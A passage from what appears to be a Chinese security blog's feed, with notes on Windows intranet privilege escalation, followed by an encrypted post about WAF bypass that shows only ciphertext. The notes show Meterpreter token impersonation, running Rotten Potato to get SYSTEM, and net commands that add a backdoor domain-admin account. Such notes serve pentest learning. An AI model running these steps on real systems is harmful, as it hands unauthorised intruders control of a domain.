title="令牌窃取"></a>令牌窃取</h2><p>令牌是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的，获取令牌，就可以不提供密码或者其他凭据的情况下访问网络和系统资源。这些令牌存在于系统中（除非系统重启）</p><ul><li><strong>令牌窃取</strong><br>如果已经获取了目标机器的meterpreter shell  首先输入”use incognito”<br>然后输入 “list_tokens -u”<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161548953.png" alt="image-20240107161548953"><br>这里有两种类型的令牌：一种是Delegation Tokens,也就是授权令牌，它支持交互式登录（例如，可以通过远程桌面登录访问），另一种Impersonation Tokens，也就是模拟令牌，它支持非交互式的会话。令牌数量其实取决于meterperter shell的访问级别。假设已经获得了一个系统管理员的授权令牌，如果攻击者可以伪造这个令牌，便可以拥有它的权限。<br>接下来，在incognito中调用impersonate_token假冒令牌<br>需要注意在输入主机名的时候需要输入两个反斜杠(\)<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161556575.png" alt="image-20240107161556575"></li></ul><p>令牌窃取成功</p><ul><li><strong>Rotten Potato本地提权分析</strong><br>如果目标系统中存在有效的令牌，可以通过Rotten Potato程序快速模拟用户令牌来实现权限提升。<br>首先输入”use incognito”命令，然后输入”list_tokens -u”命令，列出可用的令牌。<br>将rottenpotato.exe上传到目标机器中。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">execute -HC -f rottenpotato.exe <br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161607032.png" alt="image-20240107161607032"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161622344.png" alt="image-20240107161622344"></p><ul><li><strong>添加域管理员</strong><br>假设网络中设置了域管理进程。在meterpreter会话框中输入”ps”命令，查看系统进程。找到域管理进程，使用migrate命令迁移到该进程。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user sec 123456Bo /ad /domain    <span class="hljs-comment">#添加域用户</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> sec /ad /domain    <span class="hljs-comment">#添加到域管理员组</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain    <span class="hljs-comment">#查看域管理员组</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161635817.png" alt="image-20240107161635817"><br>最开始的权限是不能创建账户的<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161649079.png" alt="image-20240107161649079"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161656572.png" alt="image-20240107161656572"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161705030.png" alt="image-20240107161705030"><br>这里没有域管理员进程就随便以一个高权限，思路是一样的。</p><ul><li><strong>无凭证条件下的权限获取分析</strong><br>Responder嗅探<br>参考文章：<a href="https://blog.csdn.net/nzjdsds/article/details/94314995">https://blog.csdn.net/nzjdsds/article/details/94314995</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>权限提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bypass waf笔记</title>
    <link href="/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="1546a9fea1da70ed253cb35f053273d9d79483c4525f732dbeb7c45aaaff6aec">098d9f64412ee3ba7b7422d539a1fc87c834b9a03c2ec0d3fc8966d4c697341f82155659859201c78087a495d68d090bdd589d2949d1723461e3d1d3d1b35c6dfc66775427d0f58fd7c0c8b6e02f0cb22ccc84ab327530f1ec251944165c89cb60d74f47e788874060d61ac275af33218dfd5ef76f3c4715e9ffc810068f99219a6e43fe74dcb62f038ec0b56c3026da2498b91fb567ca323f355dcb10377f95bcfc7f02c6939d569108c97347a795e1bb427ccfb6c07eb8b5db2193bbcda4ee8c94a6251f2ae593a0fc71407bfba99c0abe0f93f2ba6472094388e6489fe0a74839376f54def41eecb1972efe718394bcea5b2efebe2b2931c11fc91025b391db10dc8a3315fdb84bb3f94bff38dcb052a8fe84b3de3498584d6aee6219b8e42eb2e42bdfe7351fedc4d93648fda10ad314799756de9296f7b42b039c9a064d8937df719dd068ac2217420d5f2ee911f2e2a455cb78ed3fc10581b0b37a522f70d14e278f8cce43518605ae00053120e604b9a4b60efdca876e1fa2937d3b304aa7103fef71c5866cb7c7557207b3c1a0beda4815c09d9d27a8aad2f1b0cce976976c1f08ea898f934861d826af487a83625d3e38d86f35127f3abd5e4181d7da3997dacef3aefca2b4475337fa61aecede86ef3c09de1c661b4568c1f55c78a0f4bd844dbeb4f6ec10eb837b6e0a04bbd6ac64dc738bd4b8347967450d8cb2832181f55f8dd4fe2e9446926e373a39a22fe0e826364b6a39c5f709bc820b54d5014ede5a33720b271f1ae033f46e30e8a57aad9ffcfd145c02caecb77f64c5d5e8fe04d9d2b018eb4d8ab2dc5942c3bd80b4e25c3b03127f72367ddd66bf11ddf3f1dca5499c42b16e0263c3a74ee18dabdb136b804299e56f55d7cec2c46ddb7b01081d81a8008546cec7a3d12f92c11c69d5ae8654a855c77935a601da07d2c3d507a40e1dead1cef5818b20c2c30aeca980522d78198b64222a847f71ba436ba1511089be64caa83df54c0c53211055fc56ac09ba1e69444b4f567f1d4d765724ba3894e600091f517a3312b682684be27a8b57c5698abf9e17697000870264e4ba734f9546eedbb88528825ace068c617398fbd9a1762fb22dfee57f894c214959a2d6ef7d2d74ff2b973b0e46ec04c6942bfd1b569af35aaba90be311ca1d06790460b9126b25f10331ca5a3223f66cfde50d4203d6daebd6f458780d88bfd5515579420cf2b654c2cad3435b799fbbd8767768cdc3276569345c61de28c092d897b40a9e4bfb94bf4066beee0d5e548dfac986557a31f4fdd029d7cb80e7c6768d443020cfbeabca981f56497d63e4991395035d6f635d180a797caadd184d9c9d81fa4e02265c574dd284561a703fe0d792604f9576a745296ae1b3c86cacda59f82fadafd3c207795955b7686ebf66eabac602bd86ec426959bc2319c7eea587d3aac699cca22186123f8dbc09168e4e0838d28b5b8e5d5d21e04193619521e917e2407d2b323b0505a3e41dd60eb9b0920f4e26dacf9c40e087b37c30cbd567895ef27ef2c185c8cf42e77dcccb3a89d0ef8ed68e8ed2a73fa84393d85b65c31c4a98284b6f8f692055938df4073954e1b77ed4b04c2821a0eb4393ceaba615dad6eb23954574fe006e1020c8dbaf9e492f45ed2689491e4c3c99d8548644b034d6e93849defc6d77b1d170bf5325c04317396e7ded4bd89d80b746c368e27f82421279a8fc6dc02b0e602b4488ec9b648aeb48cc81cf6260210aa841518cb9cc0bf8fba397ca7ab5eeb521206b6f7a4f6b848d35114f5823d0cf71d617eb16ffcc7c6d431e77c295932401915a65d069dceb28261ec8029b52b9d56202b0da5cb9e1c6d13f2c5b13ad6a611c675e842af8880c7594b6a9f674ebed215ac2a15a7b4fbd0c06d43bd12377a5cb0a967d7c17ad9c60c1e5f1ad6d7a7f5572912b09f500521ca028b720ba10ff36a7a75fd8871549a6501692e62e0c2eb8e0c76eb93c85e9182cfecb30b947e3e7e5cba7433627338b7d43db0c7d50e87aed4aa8780cf2e4cd7d02b0ecdc749cca9ac6313d65ef619d8c3d63dff6f34606ad19a24052e0adf857779b3d6cd7a47d4d9b5bbda7f8b82ace6d1a85bb1108f9441c7a2cf96364a300c667690148f3df1f65413a38dc11acae1f345d13cc31d3430b871f07b1eb400bc67c5fb80dd7f0c7ce90b469a6a0f7f14a896e2897f692e9284ed77f694fd4e12e71aa3232642c6dfa81bac7d8bf8c490070f33a6dff2b040c0edfe414ae6e7bfea7303f528fdaf6646bb93580365176833c14a98428d37fbe376301319bb5db3bb5a141874a92ac98bbbcb1750a7422605a35e7d8d164e5922d6ea9b19b161435f7dc7326de28de9e98f03c841826b9d3651086a5283000a8befb7b45a1f988dd169e965084ad4919751679c8ca9acb19283379f8c14b54f63ba5f3c9b03077b2d8add17d3c397a0d83e6a3060d1858b1a7c43203fd409bd8fd8c740bdf195c62a972353e05b8322d7f4573650c46d5f536dca64c126cb63e7851cd21fb046989884072a22f75b30739008ea0a833c715274ece3cbfdddcf92c78fbf852507224c8d52b16faec1985dc4303a4e3db2d8c4f2b703fda9d213f842d15adc44f0263c08c34850408c29215301ffff1ff579b01a6a95ac90b1ab9d111a11805307282a45b149446c04e44827686ca4086e94734791b37ee779435e26c80f9e1a9b91b172c7c9c978bf8d39467b55d065d24b0fe65a917893a24101f0c2061df09194f51236d00315620ea194f33a2fa9ac5ec08ca2626b97aeec3b8acb1a19e98b9ae6234ea9682affe2a7915ebe1c40b945a487efaa9fa3eb38d96166ed5c42497b9ad2332358724fa810b6ec0a7f7287d6b0edd0ac4214a51eb9e64866fa1086b70c1be0042098974d8fde32e3e71d0e6e0dac12a7f75e852ca903ba821b0fae79a9896084b13e4f4b93a5f3bd2a671b2f45298a5b6323a94b289ece9498fc50a0d575afc3a29f0d0b368edbd0d3184950cc983b01e25f6b0757559d804c9464530bd20f71d9c1613898aa71cd2ac78c743f1eb4e9d17584e487d72865a28d6ae47bb5405058ea3ecc6ea276f7c346d812b84c06f310b0ebf3c94444342dbfc759e88802692a9651db4186cf2eaf921dc25922592896d9e4ee1baffc397ca8a142906ee05bf953bcd3df409cc8d167e5f585599f4f7672c5ed5aa9bfedb0485ae9add3108acf16609cd18b98820f16da50004ffa7aa2e08b2b88b38978e28f3d57e4124c16f94a79ea05a2efcdcc73f478810bc2ac91ec3f8474a0d4fc5fef3f54856898b4fe98a223bd82a66fac05f7e9696f9c2b8310e7c7744bea99ad1490c470ea258cfd1650c022838aac7c2bd1f8a918ecd939daea487d8dad9d936f9f7f8e27c451c7d2d85facc31ae63a5b973ef15cf2e21491c17a00c80beca95a0c987b454b3440dbc4ac6da0446063ef6b91120ef731b278d621e5b4f9e65d98a8388efb92601fe0a0e0aabef3c641414bf8a27eefc0ce1885d90b240f80f8ecb4940cc14d88f3212e2a97bab5d281f0ca4752608bd8fe27ef95382af0cb910d0f603927c0477321fd311d89597d34d60c1cf06f7e81c8ac788e0045c5a34550388deac890d8e5221bdcb31b8059b8fb72c0c4d6a3f6680e15484ddf4edece0e8a2410e85b1ed48c8595966800d9fc7e88b51e530fb2ac43e00ab828f8a9165f740bd9ca4b311b5d0d5436bc030f850716530f09532b112f32cd0d90b1f917469467119d2f94bf01119130f3044dae982db291c57d109298a4310dbfab484c79c9f62f2e58199c1630eee3ef1bb76b22e6c042888546b6af12ecd527754286928d00052a0dafec4aa626deeb20233e2ca393b316cc801f02c31a0fe268477699bd4bb2b71d57746c8433fcb8868b27dd755575b958cec97a5bdeb96519ff7a23053ca80ba23a7d67f78fe03f22e6c14be1374ddc4dd27dbdec923d48deb656ee8267df90967651b689d893901249b3baee230f8a072ead60773646223a471ff75b53ee814183d9b64995bc68e134ff9fd7ca0e6e6893f424145306d85394c6beee767f941f603f42153f7122419cb8f868e61ad81e94b3e410ce53ab90ca7388a8ffd4c4726ef056d0538b380ae27449f90f4a8d8e84bb4efa64e059b98b31f69ac40c4a37e72977922b638035bccc4655c5644b0f21bce2a0eb4891d4bdc0509a83fd28612b8e6b4b376ce03ee9ffea29013f83bb4cbfff08de1f1aa7ab18283820e98e590f8c3c2b76edcc7e83a47e6d40d7592488062ae71afb47409e12dec0dd0f2e2238b9eb2b7f53e4f8ad522aa60b5d63a91f58127c785ef1b224bbbdf5cd79c49ee3342cfb8818589b686af8f566bcaa0b1b3b42f4e5abee43fb785aa714776339102ab2840af0533aae5d9995a97b8949dcc1445508c7c8141b0879e4440f7274b5037a80a249108374708e9a6194aaefb9d85d3005bc1ceb88048f8386591975b475bb65112efeedf2712d8df5a00e0c3db10678380c3c98b45cf7ec314b49a03194dc08a1f3b1c41bb0fe5221bca686514403697e27d0274a3ae0c9ffe8af7a225ddfa2d9e8b3030f158dbe3811425a0a238ad09b8aadcbee7e2b453a750a5fc7e07e604bb02241e9b4b4134524cdb0a9b68b8924602429c1809099c378a82d2609353295667c6394dc9c61d9759aefd29554dc91ba8ebe7daac256928a4a351ea349fcfce8f3be81dd76d9b17b5b741665003ef44e4fa99af6903891ace7907e6bc9ec5b426fd887dda62e8a13c6f6592e004b469a209a3efe8d38dd967d827c15a5f6b8926ea1d1cea47e0a5e620a195a013031bf978e14af5bc73e9b73f79ecff4cd7537967ad14fc4571bd1ae688fdb72cb45f9714b5d4e2385ab577a94b366cd8feade4999a1613a95ab6077b8d3a2fb5b54282d3fc8c1508df232840d2f213c04ebc675af9af66f8cffba7ee9f1e222707804a1b03a92aa8932ac3e5a43ef5c45b6d7a15bdc4b9ae4430fe965b10cb306f000f2baf2d17e0b3e65d268c153b77f057cd6c8511d2b5722027bbdc562e619fcf68d507a6d055cac85f50077fc1a7de5ee3e64f9eb49839ba6c2cf9118a9abd1e0f390e7600e2e2b75e88de25fcc4c26780970762674c70e62d69245b6e801bf827dcc138330bd373b3bc2ea361d13b5ffde361be3fc5591c8d945a228b48e606e4b319956b0702adec0b045d3d527b7d82f11c08afe9959ca1b7a63190cb1139fcdb441e8950fd2e3a297ac6db00e3cb1be8e87df34f091976fcbabc1a0603017dd61dd16c14644163912526f1cd71e691d7d08943cf5b94d48d6ed3667a9bf1ed2dfbdcab33a79fbee797254724032710a8d252414a5bed2d4e8a8fd8bdf0498d4f81f16cdabca4245acb16b80f883146f8b752d1b82d1919a09ccf8d33beadf697ca311e6a8ddd2721cb2b02ac3cdc6d69a199fbf3327ccae3478074d84d2b361949e0456bd28e60106d7d5d1d78353b274e3520f90a109fad90835ea215dd88dbe61be1ea86c21426450e0977de0f0f3c0885ae07478206c83017a86b3ad2d411303a5cb4f005d7ff7d66f6ab7248ad0ee8578790e4c49a134f0a335c110d4bd10cffac0f3963d1fc334c16175af83adb3d34819aba1ee93b7802d5bd31deb4e3bc9296274411cc5dc529eb446337a4f4a4fa1c63ff39858124926b5ccd03e9487ea38ae4ecc7ad0290dcebeb297ff2a47bc92e4b562c011049744d25f1b7a3dfd93af8adba0f9c668de4bfcd7436fd6591170db5cf14d19e200b04c91730e69f8a3be7566424fa29cccb2a1cc8df22f2abd477e309a776971159eeac84b81a2bb8fa302740c8f4afe53c4a73b435f6ce94ba45e2d763ac1135f6c3da4c0758560698a717f2d74255741eba71e2d34b37c63715d712d27e61ce2dbf8e8f50ec5cddeb40e556566308c0ac3c156d4afef77d9094ab45616418afa5197e176e56c28d80b0c1e3cb83c2b9e8da3a64d4aa248e940b94aee64d3f428f4902313a5730c9b26bdea1a797ea970b55b2c0e8b60be878cf0d0aaacd9953dc942649b176cfbccd67e5332e50563edb79fc3fb7514af85356e7192c736477e1842908b5a8bc0937c9a778bc320b9d6a79722078436c570dde456427b6d07ffb0f9ec24352cca8d68d2c3cd0854eda11ab1c1e5fb2e37652a7852e581015fcee5e0210cd476f2620b7fb2ed1a310d769747179dbf6d11ad89d79c94a95aba9bd3d3871c041c21cba1c9b3726d2d39466dd580809b104c103de1a9c1794d99c9561a0f3a94f6d43cd36c1c84f3b3ad0d600ff699b3b2ab48bca1a663d585fef4842c0403706c2ce5e2ef2ef533f6f07b9d0d8c14229dc0b9c878a58a7edbc1fec15f25d69ae709e4cdc7e114aed965b881e05707d6421db16fcd3fb3e594ba3ff752024ef9a5cfe095a638acd7a83529aa4701aff48ee3ec773bb8a152b91fe9169731487d977077bcc9e0bf0b75cb7c256795dc64750d6b4bce32e1caac1117371ce73d3b5fc79238d03ef4c4b231db4a6fd9ee7e32ad340daf34bd548f46de7ccf0594fe48774f6cb218dcd89c4f39c3cb979a5582d667a88a7a5a269de4754cb17f2dcb9188f7695fb578898977be1b65a99c631d2c9b79ab7cd3f05355a4b7841c15663193771d5c8aafbfc6932313f6593fe203125bc1109f02584f35772f87a246a4f2f6c606d646bb67bb5a92d9a9b2e3bcb1fc54adda2f9e60f2c4b373a725a420b262b82c1e8be35145f83e2f18783dbf6b778a351035d99f87b9a94efac9e672d26ccec6250d214c6df331b395151ac1fdbd2113dc76f02426c0e6988425278f1b940cabed0bd5a23925b2948c63131751354c34ec64de2a42bf024a270ae551f9c8c15dfd618c815f2f9e5af0d8fa7350491186f1bda3e89712d18a1810550f971d493711a9006b161f643d815688c00b3800eec8717d5dc39ba0f5e77e0cbac301533605b0c3bc2c899010d5020d549593ddd175a0bdfa3b13ba4544f1b9e3325fdd1d1bb74d16d36ffdc514d15cbb7a36e793f3f062d1f82c6ebeb7bf545a077ee1d4123d84ee7a674ed30afe03a2e61d5bd4f018326b45bb39f37f8a7a9ab2d58add6238c8f7f54644a273d1f77e67713e2cdc4754c5a58745a881a833360640624aaacd71f7e36b55766e006982f3255ed47ff2ff3055493c05859f71a67bb0ea125b17fba256bdc6717722931b8a8b81ff6b62c92f7c534644fc2b681ab4bc39983006d5dd2722d0ceb16ec1b0b8858ffafadbc3af300ec0fd6140aed91b83d997796151f8aa18c57425284ca4fb09b479a6b4b3f8819aa651072cc94bc5feda6068a8cb94e06c3928d7642c8516c5a30db2e8cc6cfe9c91e753bbfe9336d57e304132986ac63c72b96c8a6471accd0b4e416184c7098ed8ece879f8b90517a008c9583a86f0be60ca436c7861bb0a916b37630b06d0cab5a9a7fc38c09f13009534de1a5b5b0ffa5cfb6dc9bff4268f73db0b4fb66fd3b8218d22e9d9e4a1c79aeb533e1a15f33ce4a1c7105aca7541c0a9eb353e9f96cfc343cc964b2c5606aaa133259aed431e3d891d67f529da5b9957d2fabc24c18ebdbe1328ad57ee9de1eb714a01bff8606863adc01eed59305e805020f09c1e560d8bb1e1e49df2f6c96bd138041d30b26ea096bd83bfe59b11c040efd97d4cb8d6492d456a7da420de79c1c7ddae9d740fbed5c92511f47301a2a3bfe955a2d76ace37ca0762bfb95ebd2d8acbe24a82e70cbd4beeaa94f7f9448845e8de0a1678a23248dc7e3478f831803555b2705a06177a504b594e34e604f5e1d21a1fb0eff85be890d3a63bb1fa24c32d9b437d2021d229903697e18d5b7e73c2485096033454f9fa1f6fd109e166ebd6ca702d8e12adb640b200911dd0cadf165dad0b68f67e4e2a9b4be054e0bfe34930d2071abad597243988458fcb9a373d542c47e9eb5ca27a47e43569c7d606fe930940bc1b37fb0fb71d8c7da1f11459e5581413aa37196c0a480a17b1880bc48d9b52c7201b2c1884a818eedee1f60ea074a00bd2fb8fd9d0c6f75db506701ce3d5030c140d987c856d2046ab53cdd126e2d5dd72f4595c33b64096d031e6bd8361df18f7c07c16464c60c19b6e909b3defe163e0bb81596be044d4a44ee130765d54a60e89467b1033554ec21b9e9813c26b5e266192472ae20be3e4ca515f73e26a91aff64be84aded7b53c63d1450e64aecad9721ceb4c763cd6024d5c321d65be75668bf81948911a594fe5da5e2a3b6b7eed1cbd7071714ca949d78593f1afbac7099df22d3ce39624609764952a01a5bec5f34dbf59e4e44fcb4914e6472528a5255ab006f5c46b68a26fc6ac9261b3ab63c2ee059377f297181ab9c3794416d19926e3dd341ec183d2e9d98d56e82e44025e0c2ab0b1565a3abae07d8541ba7f4309c1c2160f61adbf7378d3d32adfd3d6a8b46ab8de6b3aa8ca5862c3742b91dfd49a997a795f6c18c2eddda21f2d4ebba4aef46bc0bacb7eccb207aac24461f062a2ae893f93023cd90b4fd091dc4ce1b5f2d6e137d42198254dacf0c1b9299acbbe61e6b5b51debd50933b0c20e702c5b13266dfab5f43a1ebd47b30f9521d94ab09767c843feda92e404b9c340e4d72ee3b8b4db4e52e61867ba9895776e34e88ef62d91ce0bcac7cdc499753bd82a08bf79b35c860c07bb9ea92931944753385aed6198f28fbd17e6ed0ead792878e6718d9b6736e0b8c5ba25142869f2e87740fc1581759e0f21bb1b8716f34a973e7ebad6da4ef501e9619601e50c87a62b91eaafc15033f678bcd99c44510a40fe008251fe0d1fb2e1fcf882a8e3cc1a32c903e7e997ec725b65fa2173e5ecbd7911ba0d3e086995b3e43d432d0d5cfbc3ed860cf8fc4838cf7ee32c2f8e1bcbc4c081a9fa9603fdb9e0d70e4c38146715a1e4b5dba974b4898b66bafa68ddc588543c32d5562a062f5a8002c8722cfb078a67989af7134133c32e5ddc263cf153892b6d14f9f65057fb5839bea3198ae4eaa61441d4147bec06f721303494108e39b004f8db4cae772ea45ac015a3b015818c4c6028accf1b4f27cf0c894661a139b59e19545eedbb60cd51ac0416b3c2e365d63f6b418b3e169ee66c73c24c278dec0db019d6602c404618d3ec0efa6f1ac112c67776641e6d57798409eaa98ed17386959fb856b7b58f58d8ae47a3ad482525f956342770a993e9e1698fb3b7b74babce01458b1d4121133369091f7b3fc1852fa9138fbcd4286b35ed0a5a3291eff0b9c18e2ce590f13d260bd4919e09fb49189263dae898752a3546c416c9cdc20c470fc829cccfe6a83d051c6abf47c491abdefef54d2a47715e8a4ecd7684742b9cb05a6e8adcd66acc7d3db6fe676e57c864e4b54bb6b7560dac6e145210dc18d6dc1228a40b8828fa2617e90c55f9d826c3ba9dfe4a21e9adfa0421762eba5e110e98c54339160321bd44d447d010d86bcab58b529fe19ec530303b7a86bc43b149d6658ab5eb47dae215dec1685ce0feeb2cbcdafbdbeb5ff1026c95ce1e661cf2e79a8fe9425badde54bedd2c87a260b758268c7e7ef62696ed80c38e3d88f6d2d04f892649408a5ff1d5bb1545250c0645782e70901f609cc1283570abce11b6dc40aed3f58eff5fa7947aee5b2052f6ee2d8dc57f24f4eb8a6633ea974f5b384336a1c12bd65530aedfcebe62d0fa6a656724cd18c54efb14ea24c0f3f9f61dd4b60e83c61df045586341c1f70191ebee3d531b2927d58ddf331588cafbf66be60cc19b85936e328e7467fc28a6ba299407be2f88250aac3047217d159f1c3ed547422da1337cfe287711af77f325e27ec63f480de24a55e3377d9f3647eac44f94b79debf7f1c42e9ded2119fe9984d827868073b553399c9053260cf9ef01812c6c99236a1c588b4579f25e6f9b83b3505cb7a2858fa30780247f4c3769c1951501c52ed488e2c780981f501c2be0451d5e9f23115d880ed91800048c4b4b1581f0b62ea6120828e3dbf9d02ce630e60c4639162e76ae40e6edd71c76cd91b09d82862b9a5c249659d2d2dfb42251ea2073cb6db39ec36ecc098d99754c9366eac19f1a43afd9eedb5705441b155d6dec16401f9b6845ae9ab4c6fd737ac07d07cce1847da2c6accbea3e31e0dfce0dd1aeb0ef081dc88e9e89d573160330073f22d810127524dd2518554e7c48a5ac051ed6aa2e28372d5ee5955bf4229b77ad431d87f2169bb68f092f7e8caf186c2b0efc0dd0359af2077cf39a4ee12fb543b768c6ee6f1af9b9568e8eac6767cef2c753e5cc3bffc3e9484da55d781dd3181c83c349f913daba70970b255d50ef53ffb197ba42c0fed7670479724a292fb4e2fcdd8ca54fb3907909b72793409326c3b85e52aa9c950e0ce6297c29d91ec39f9b2ac1ad70c0754a7b440a45fa2ce82d5182ac1d722f2b8e5f35168eacf9c083fff6161c4e2e6c51825b085d4431025e3f5e35420f1626835b1cf7a0e4452cf0c8edbafdd91f5285bbf5d96577364eb0bdb91a450b8d5fae8f5b7c03278014be908f5d92910038764a98169d4d12b22a2d7c5391086daf50a7bf29e1b54a4c99f42d891906f6183530f6c5cdda1a8c7d4b35e91c2503d13fb92514b1663369c9e3a8b060e3949a724de298e92cefbb046e147c3174d92fe7fa97487e61dc338191c540e14cd975b38acb31ff1ad35cb188a38b656641c592d2fdad7ee83d88e98756788c4c5c36c63bcc69a6ee128f4c51d1917db6f69d11ef4bb2eb4081021d5d1a3b1c74ad047c1da61405e31909e9261aa45b71662951cb7759113b61185a52c3e3958258fd398f07d58820fa156718f942076f24e34b34e8bc77ba3e6ea1da35e53a35533761c3e45cd018b7826b1b0b56031ea51b57cd7a3d3697b8b65b43e07a3c29783a1aa3cd0f5f37789b212e5f983eff16af0ee1707baa5157e593fec5793576eff4692a495965e73ff3f35627d192c171c937cc118e5c75f77067c2ef20db5371c3dc79a40175dd28905a955089ec4ff1f9d83236751be9048daebde87af8da01c0a61c8d7fc01a9400afcc91045e4bd9e2f036d7a02b970353ca77a7d5e8e47fe4bb77d14e2a9e8b229de58d381486d7b5c6fc5d074c6d8f72bd5daed595eb023273e62be797456630a517a689d9d1652ed780a2b16114b6e8fa9068465c07cbb5d4572461effcf6115a92af43f6560161b666120c70155e23f1ca1b1816ff50a3063225aec3b7dba5014e685acce81d7f8847c67bbf9e023487f8b72d89834f66a27ae19cc2f029940cffee40894784fc576fb4be500b2ffc62c960c630b9f65de02e4bb78cb2fb8889beb253e48ffc950b5e09d4d54edd2ecc52cfef4053b9d3bcfb7da97b23b1c77e1956164db09aaa44b7534a276d6170c94c8f5f2e7a19a37fef5832c6dc310569b883ea384b6097c24987778e3ac486e2b3ffb61ceb9c0873fbec53fc0a2b2ffa17b34583e481355b2c613f055eeb872eb668938546e66e27a1ec772c20a43002a6f307d7dd27bfe83a79121a9b8468c49484bff25fba4db5108392159e6bb86697d656881cfb3048e771410fa49ebbd98a8567c357c8f9770e1b5470887b94c011e0ea965d159796f1231cbff8c9b493f755e86ca39be7272a5882af55198740ba3e688a3cc97f380d8144f93bd927b146fe0b2ced1e7fa15600e343a23150bb461a6f0186152571a4b99e9ef7430cd40eec4f2b7a7c9443f1c66ef06be6031b0bd7dac68e967da053ce237abfc57bbf5015fc15069b2fee34574dc1d625abb13c86a4fafc48960f7e1fe31f7760fde1e854fbbef0019b62afd085904bbdc98c28dbf24dd5764284110ecb3683183ca97924baec6cf672a9e9ce5452ff2d87ac696d8f0f684ee0bfadc52d8480b310ea5c9cf7820bd754c1b38e09b1f8bd00520973123ef10d79aaa4587bb969d88112fadc24139a99bd3080e9a2934a3ed6f2ecffb60d3691872e03f79e1a927fdfb80b4bdf11069c4ee9e46ca7a3a625a9fda0859b0df6d42f821c8a3c3c79af50910b8e8858094dc8f6581f42b2243b5c132dd3e9ab9b6627e6148e324e2a750aa2fd6f5165a8d9657dcebaad62a9ddecee26c219ea38e2fcc068e52ef4bdd21345956e1054bfc357ac0a92a584160e7f0a9fe394deac7db394ad23542b7a0b0a9b9d74fcc36d2990a13bf8b473dc9825aaa017ab8c31af095eca3ee18e9f69056e74a35cfc5c6c23c1bb5faec63ac9c9f38bf82436e05d6bc39b8186a430822e44e8e7dd69c0e8f3ccf036b90db08a98c1c396990e6949050836f961588983e02486def159c64fd5770a1380cfc0057a40a7efa09baed21c8b2ea0c7a552278e4e3a528e033e4f6583de9f093b4c42b23c2049d9b3b64edea13f992cd5deb9692bd9d3e2841a91f62e943c94088419643f34e60a027da49282089926331e16442225fe962ef30999c25ecb49c3e4638e8f1a70c34a8b328af64bb1e0ccc80658cee547623212f8317b65484783e6f1a73bf77fc93cb3dc6021905e950d1d9268dac1b2b93ee45764494eb85e74534e5f70c518f32d14655620bfa94be1156695463a7693d29c39d5dcc85f18f34eef12b97df2da169f9d396714c62287a5d94d78aa5cab84612e9e54fb40061d1b4635bd5d43fe99953cc87bbb989b42638c7baf197c8c9af8a4f7dca011bfc3c284eef4af577e4677ab9045727e08e184599e278798c0b3e856c1320d747d1d830e18d0a090c3f70195181a740c8e9c7bebc6dfb611fa9cecae7a1ed65debe9a37c7f842fd08b30af84c0ae0016a94be8e25362acf48445cdfa128760d30992c2e29ba03788aaffbd288d5145b2544e35a111fa3fc373d4e9d1ab831dbdcb5491565ad791f182208b6f3ee4cad1dea288d117c077376d267322b90662e294cfc9d403983a8beeffa7a3df0f5d22b645d67a32b372af2788e99e54c6e19c870d538924fc69f83eb9554a05cd90e2d1be13dc10c016ca161caf87f1dd15912f9d3fc6c6c1f1d3668c0e6b81933c32537dd9c48eb2081d70e726cb3e8c7849d7b509a4e79d9e1b725daf9ff47f04205fb09a119c3d840296dc50e11755fce7c14315d5dae6a3de91e43aeadbcbf0b5077738b5a9ac524076090d62265781b138574dded2f1d3283ffefd0c6e19d2d3f46786cc000e022f3845a34a5d602155007bb41eb1bdee297401ca97a3c7372197dfd5ce00674c4f68a59aa3d076